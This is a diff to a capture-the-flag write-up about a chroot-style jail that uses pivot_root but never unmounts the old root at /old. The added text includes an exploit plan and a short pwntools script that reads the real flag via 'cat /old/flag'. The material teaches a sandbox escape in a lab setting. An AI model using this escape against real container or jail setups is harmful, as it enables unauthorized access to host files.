@@ -96,7 +96,7 @@ int main(int argc, char **argv, char **envp)
     assert(chdir("/") == 0);
 
     int fffd = open("/flag", O_WRONLY | O_CREAT);
-    write(fffd, "FLAG{FAKE}", 10);
+    write(fffd, "try harder", 10);
     close(fffd);
 
     assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
@@ -104,38 +104,38 @@ int main(int argc, char **argv, char **envp)
 
 ```
 
-= Mount Namespace and pivot_root Escape
-
-== Introduction
-
-This challenge uses more advanced Linux isolation features: **Mount Namespaces** and `pivot_root`. These are the building blocks of modern containerization (like Docker).
-
 == Vulnerability Analysis
 
-The program performs the following steps to create the jail:
-1. Creates a new mount namespace using `unshare(CLONE_NEWNS)`.
-2. Creates a new temporary directory to serve as the new root.
-3. Uses `pivot_root` to move the current root to a subdirectory (`/old`) and set the new temporary directory as the root.
-4. Bind-mounts essential directories (`/bin`, `/usr`, `/lib`, `/lib64`) from `/old` into the new root.
-
-The critical vulnerability is that the **old root remains mounted at `/old`** and is never unmounted.
+The challenge uses `pivot_root` to change the system root to a new directory. `pivot_root` takes two arguments: `new_root` and `put_old`. It moves the current root mount to `put_old` and makes `new_root` the new root mount.
 
 ```c
-    puts("... pivoting the root filesystem!");
-    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);
-    ...
-    // let's remove the old root mount
+// create a directory in which pivot_root will put the old root filesystem
+snprintf(old_root, sizeof(old_root), "%s/old", new_root);
+// ...
+assert(syscall(SYS_pivot_root, new_root, old_root) != -1);
 ```
 
-Despite the comment, there is no code to `umount("/old")`. Therefore, the entire host filesystem is still accessible from within the jail under the `/old` prefix.
+The vulnerability is that the program **fails to unmount the old root** from `/old` after the pivot. While it sets up a jail, it explicitly preserves access to the entire host filesystem at `/old` inside that jail.
 
-== Exploitation Steps
+== Exploitation Plan
 
-=== 1. Accessing the Flag
-Once the shell is spawned inside the jail, we can simply read the real flag by prefixing the path with `/old`.
+1.  **Identify Old Root:** The challenge source code (or exploration) reveals that the old root filesystem is mounted at `/old`.
+2.  **Access Flag:** Since `/old` corresponds to the host's `/`, the real flag (at `/flag` on the host) is accessible at `/old/flag`.
+3.  **Read Flag:** Use the provided shell to read the file.
 
-```bash
-cat /old/flag
+== Exploit Script
+
+```python
+from pwn import *
+
+exe = "./challenge"
+context.binary = exe
+
+# The challenge gives us a shell. We just need to interact with it.
+p = process(exe)
+
+# Wait for the shell prompt (or just send commands)
+p.sendline(b"cat /old/flag")
+
+print(p.recvall().decode())
 ```
-
-The program's "fake" flag is at `/flag` (relative to the new root), but the real flag remains at its original location on the host, now reachable via `/old/flag`.
